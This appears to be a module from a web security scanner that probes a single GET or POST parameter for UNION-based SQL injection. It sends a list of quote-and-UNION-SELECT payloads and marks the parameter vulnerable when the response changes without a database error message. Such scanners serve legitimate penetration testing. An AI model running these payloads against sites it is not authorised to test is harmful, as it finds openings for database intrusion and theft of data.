import re
import urllib.parse
from ..utils import send_request

from .. import diff

ERROR_PATTERNS = [
    re.compile(r"you have an error in your sql syntax", re.I),
    re.compile(r"warning: mysql", re.I),
    re.compile(r"unclosed quotation mark after the character string", re.I),
    re.compile(r"quoted string not properly terminated", re.I),
]

PAYLOADS = [
    "' UNION SELECT NULL-- ",
    "' UNION SELECT NULL,NULL-- ",
    "' UNION SELECT NULL,NULL,NULL-- ",
    '" UNION SELECT NULL-- ',
    '" UNION SELECT NULL,NULL-- ',
    '" UNION SELECT NULL,NULL,NULL-- ',
]


def fetch(url: str, method: str = "get", data: dict | None = None) -> str:
    """Fetch a URL using the given HTTP method and return the body."""
    return send_request(url, method=method, data=data)


def test_parameter(url: str, param: str, value: str, method: str = "get", data: dict | None = None):
    """Attempt UNION-based SQL injection on a single parameter."""
    data = data or {}
    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query)
    if method.lower() == "get":
        original = query.get(param, [''])[0]
        try:
            baseline_body = fetch(url)
        except Exception as e:
            baseline_body = str(e)
    else:
        original = data.get(param, "")
        try:
            baseline_body = fetch(url, method="post", data=data)
        except Exception as e:
            baseline_body = str(e)

    results = []
    for payload in PAYLOADS:
        if method.lower() == "get":
            query[param] = original + payload
            new_query = urllib.parse.urlencode(query, doseq=True)
            new_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
            try:
                body = fetch(new_url)
            except Exception as e:
                body = str(e)
        else:
            post_data = data.copy()
            post_data[param] = original + payload
            new_url = url
            try:
                body = fetch(new_url, method="post", data=post_data)
            except Exception as e:
                body = str(e)
        error = any(p.search(body) for p in ERROR_PATTERNS)
        diff_found = diff.is_significant_diff(baseline_body, body)
        vulnerable = diff_found and not error
        results.append({
            'url': new_url,
            'param': param,
            'payload': payload,
            'vulnerable': vulnerable,
        })
    return results
